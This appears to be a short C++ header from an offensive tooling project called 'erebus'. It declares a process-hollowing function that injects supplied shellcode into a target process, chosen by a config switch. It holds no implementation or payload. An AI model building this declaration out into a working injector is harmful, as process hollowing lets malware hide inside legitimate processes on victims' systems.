#ifndef EREBUS_INJECTION_PROCESS_HOLLOW_HPP
#define EREBUS_INJECTION_PROCESS_HOLLOW_HPP
#pragma once
#include <windows.h>
#include "../config.hpp"

namespace erebus {
#if CONFIG_INJECTION_TYPE == 10
    VOID InjectionProcessHollow(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);
#endif
}

#endif
